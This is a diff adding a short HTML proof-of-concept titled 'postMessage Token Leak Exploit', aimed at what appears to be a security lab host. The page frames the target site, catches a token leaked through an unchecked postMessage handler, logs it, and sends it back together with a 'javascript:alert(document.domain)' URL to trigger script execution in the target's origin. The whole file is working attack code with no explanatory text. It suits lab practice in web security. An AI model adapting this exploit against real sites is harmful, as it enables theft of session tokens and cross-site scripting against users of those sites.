@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>postMessage Token Leak Exploit</title>
+</head>
+<body>
+    <h3>Loading exploit...</h3>
+
+
+    <iframe id="target" src="https://aafxmljwap.voorivex-lab.online/"></iframe>
+
+    <script>
+        window.addEventListener("message", function (event) {
+
+            if (event.data && event.data.token) {
+                console.log("[+] Token leaked:", event.data.token);
+
+                event.source.postMessage({
+                    token: event.data.token,
+                    url: "javascript:alert(document.domain)"
+                }, "*");
+            }
+        });
+    </script>
+</body>
+</html>
